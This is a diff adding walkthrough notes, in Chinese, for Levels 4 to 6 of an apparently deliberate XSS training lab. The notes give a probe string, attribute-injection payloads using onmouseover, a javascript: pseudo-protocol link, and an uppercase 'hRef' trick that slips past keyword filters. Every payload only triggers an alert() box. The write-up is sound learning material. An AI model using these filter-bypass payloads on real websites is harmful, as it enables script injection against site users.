@@ -85,3 +85,80 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 ```
 移动鼠标到输入框触发onmouseover事件，过关！
 
+
+# Level 4
+![Pasted image 20240826201105.png](/img/user/picture/Pasted%20image%2020240826201105.png)
+先用测试代码看一下
+```
+'';!--"<XSS>=&{()}
+```
+![Pasted image 20240826201130.png](/img/user/picture/Pasted%20image%2020240826201130.png)
+发现下面输入框过滤了我们的尖括号`<>`
+所以我们可以调整一下第三题的payload，并且闭合双引号
+
+```
+"onmouseover='alert(1)'
+```
+
+# Level 5(绕过检测<script和on事件)
+![Pasted image 20240826201331.png](/img/user/picture/Pasted%20image%2020240826201331.png)
+测试payload看一下：
+```
+'';!--"<XSS>=&{()}
+```
+
+![Pasted image 20240826201442.png](/img/user/picture/Pasted%20image%2020240826201442.png)
+发现好像啥也没少
+用之前的payload测试一下：
+```
+"><script>alert("xss");</script>
+```
+![Pasted image 20240826201714.png](/img/user/picture/Pasted%20image%2020240826201714.png)
+
+```
+"onmouseover='alert(1)'
+```
+![Pasted image 20240826201759.png](/img/user/picture/Pasted%20image%2020240826201759.png)
+
+
+
+这一题可以用javascript伪协议来实现
+payload:
+```
+"><a href="javascript:alert(`xss`);">xss</a>
+```
+
+
+
+# Level 6
+![Pasted image 20240826202233.png](/img/user/picture/Pasted%20image%2020240826202233.png)
+
+还是测试一下：
+```
+'';!--"<XSS>=&{()}
+```
+
+![Pasted image 20240826210403.png](/img/user/picture/Pasted%20image%2020240826210403.png)
+
+
+用上一关的payload试一下：
+```
+"><a href="javascript:alert(`xss`);">xss</a>
+```
+![Pasted image 20240826210514.png](/img/user/picture/Pasted%20image%2020240826210514.png)
+发现href关键词也被过滤了
+
+用另一个试一下：
+```
+sd"></br><img src="javascript:alert('1');">
+```
+![Pasted image 20240826210653.png](/img/user/picture/Pasted%20image%2020240826210653.png)
+发现src关键词也被过滤了
+
+这题可以用大小写绕过
+
+```
+"><a hRef="javascript:alert(`xss`);">xss</a>
+```
+
+
